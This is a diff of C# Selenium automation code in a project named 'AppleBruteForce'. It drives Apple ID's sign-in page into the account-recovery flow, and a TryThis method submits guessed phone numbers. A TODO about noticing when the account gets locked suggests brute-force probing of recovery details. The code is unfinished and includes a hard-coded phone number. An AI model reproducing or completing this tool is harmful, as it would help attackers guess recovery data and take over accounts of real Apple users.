@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Reflection.Emit;
 using System.Runtime.InteropServices;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
@@ -12,91 +13,90 @@ namespace AppleBruteForce
 {
     public class Engine
     {
-        private object GetControlById(RemoteWebDriver driver, string id)
+        private IWebElement GetControlById(RemoteWebDriver driver, string id)
         {
-            var xpath = string.Format(@".//*[@id=""{id}""]");
+            var xpath = $@".//*[@id=""{id}""]";
             return driver.FindElementsByXPath(xpath).FirstOrDefault();
         }
 
-        public string Execute()
+        public RemoteWebDriver CreateDriver()
         {
-
-            ChromeDriver driver = new ChromeDriver();
-            try
-            {
-                var appleId = "foobar@gmail.com";
-                var pwd = "foobar";
-
-                driver.Url = "https://appleid.apple.com/#!&page=signin";
-                driver.SwitchTo().Frame(0);
-                
-                System.Threading.Thread.Sleep(1000);
-
-                var idControl = driver.FindElementsByXPath(@".//*[@id=""appleId""]").FirstOrDefault();
-                idControl.SendKeys(appleId);
-
-                var pwdControl = driver.FindElementsByXPath(@".//*[@id=""pwd""]").FirstOrDefault();
-                pwdControl.SendKeys(pwd);
-
-                var buttonXpath = @".//*[@id=""sign-in""]";
-                var button = driver.FindElementsByXPath(buttonXpath).FirstOrDefault();
-                button.Click();
-                
-                System.Threading.Thread.Sleep(1000);
-
-                var ntdpXpath = @".//*[@id=""no-trstd-device-pop""]";
-                var ntdpLInk = driver.FindElementsByXPath(ntdpXpath).FirstOrDefault();
-                ntdpLInk.Click();
-
-                System.Threading.Thread.Sleep(1000);
-                
-                var needHelpXpath = @".//*[@id=""need-help-link""]";
-                //var needHelpXpath = @".//*[@text=""Need Help?""]";
-                var needHelp = driver.FindElementsByXPath(needHelpXpath).FirstOrDefault();
-                needHelp.Click();
-
-                var allXpath = @".//*";
-                var allControls = driver.FindElementsByXPath(allXpath);
-                var tags = allControls.Select(c => c.TagName).ToArray();
-                var texts = allControls.Select(c => c.Text).ToArray();
-
-                System.Threading.Thread.Sleep(1000);
-
-                var recoveryXpath = @".//*[@id=""acc-recovery""]";
-                var recovery = driver.FindElementsByXPath(recoveryXpath).FirstOrDefault();
-                recovery.Click();
-
-                var tabs = driver.WindowHandles.ToArray();
-
-                driver.SwitchTo().Window(tabs[1]);
-
-                var phoneNumberXpath = @".//*[@id=""phoneNumber""]";
-                var phoneNumber = driver.FindElementsByXPath(phoneNumberXpath).FirstOrDefault();
-                phoneNumber.SendKeys("07979536654");
-                
-                
-                //< button type = "button" id = "action" class="right-nav button last" can-click="{navigation.buttons.action.callback}" role="button">Continue</button>
-
-    }
-            finally
-            {
-                driver.Close();
-            }
-            return "xxx";
+            return new ChromeDriver();
         }
 
-        public void WriteOutControls(IEnumerable<IWebElement> elements, string elementId)
+        public void SetupDriver(RemoteWebDriver driver)
         {
-            var ids =
-            elements.ToArray()
-                .Where(el => B(el, elementId))
-                .Select(el => el.GetAttribute(elementId));
+            //var allXpath = @".//*";
+            //var allControls = driver.FindElementsByXPath(allXpath);
+            //var tags = allControls.Select(c => c.TagName).ToArray();
+            //var texts = allControls.Select(c => c.Text).ToArray();
 
-            foreach (var id in ids)
-            {
-                Debug.WriteLine(id);
-            }
+            var appleId = "foobar@gmail.com";
+            var pwd = "foobar";
+
+            driver.Url = "https://appleid.apple.com/#!&page=signin";
+            driver.SwitchTo().Frame(0);
+
+            Sleep();
+
+            var idControl = GetControlById(driver, "appleId");
+            idControl.SendKeys(appleId);
+
+            var pwdControl = GetControlById(driver, "pwd");
+            pwdControl.SendKeys(pwd);
+
+            var button = GetControlById(driver, "sign-in");
+            button.Click();
+
+            Sleep();
+
+            var ntdpLInk = GetControlById(driver, "no-trstd-device-pop");
+            ntdpLInk.Click();
+
+            Sleep();
+
+            var needHelp = GetControlById(driver, "need-help-link");
+            needHelp.Click();
+
+            Sleep();
+
+            var recovery = GetControlById(driver, "acc-recovery");
+            recovery.Click();
+
+            var tabs = driver.WindowHandles.ToArray();
+            driver.SwitchTo().Window(tabs[1]);
         }
+
+
+        public bool TryThis(RemoteWebDriver driver, string phoneNumber)
+        {
+            var phoneNumberInput = GetControlById(driver, "phoneNumber");
+            phoneNumberInput.SendKeys(phoneNumber);
+
+            var continueButton = GetControlById(driver, "action");
+            continueButton.Click();
+
+            return false; // TODO validate success, think about timeouts, capture account it locked.
+        }
+
+        //private void WriteOutControls(IEnumerable<IWebElement> elements, string elementId)
+        //{
+        //    var ids =
+        //    elements.ToArray()
+        //        .Where(el => B(el, elementId))
+        //        .Select(el => el.GetAttribute(elementId));
+
+        //    foreach (var id in ids)
+        //    {
+        //        Debug.WriteLine(id);
+        //    }
+        //}
+
+        private static void Sleep()
+        {
+            System.Threading.Thread.Sleep(1000);
+        }
+
 
         private static bool B(IWebElement el, string elementId)
         {
